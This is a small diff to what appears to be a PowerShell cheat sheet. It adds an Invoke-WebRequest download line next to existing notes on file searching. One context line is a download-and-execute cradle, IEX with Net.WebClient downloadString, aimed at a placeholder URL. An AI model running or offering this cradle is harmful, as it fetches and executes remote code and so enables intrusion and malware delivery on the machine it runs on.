@@ -569,6 +569,7 @@ Get-ChildItem C:\path\to\directory -Filter *.extension_here -Recurse | Select-S
 
 # download file from web server
 IEX(New-Object Net.WebClient).downloadString('http://URL_here/file_here')
+IWR('http://URL_here/file_here')
 
 # search for a file
 Get-Childitem –Path C:\ -Recurse –force -ErrorAction SilentlyContinue -Include *.extension_here -File
